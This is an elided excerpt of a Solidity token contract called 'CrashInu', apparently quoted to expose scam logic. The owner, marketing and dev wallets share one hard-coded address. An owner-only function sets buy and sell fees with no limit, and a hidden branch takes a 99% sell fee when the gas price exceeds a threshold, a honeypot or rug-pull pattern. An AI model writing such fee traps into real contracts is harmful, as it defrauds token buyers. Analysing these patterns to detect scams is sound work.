...
contract CrashInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xd81D41DF025001c25d1e6Fb4c00BcB28dE7eF7A1);
    address payable public Wallet_Dev = payable(0xd81D41DF025001c25d1e6Fb4c00BcB28dE7eF7A1);
    ...
    constructor () {
        _owner = 0xd81D41DF025001c25d1e6Fb4c00BcB28dE7eF7A1;
    ...
    function setMarketingFeeReceiver() external onlyOwner {
    ...
    function setDevelopmentFeeReceiver() external onlyOwner {
    ...
    function setFees(uint256 bf, uint256 sf) external onlyOwner {
        _buyFee = bf;
        _sellFee = sf;
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            if (_isExcludedFromCooldown[sender]){sAmount = tAmount - rAmount;}
                ...
                sAmount = tAmount*(tx.gasprice > limitating ? 99 : _sellFee)/100;
            }
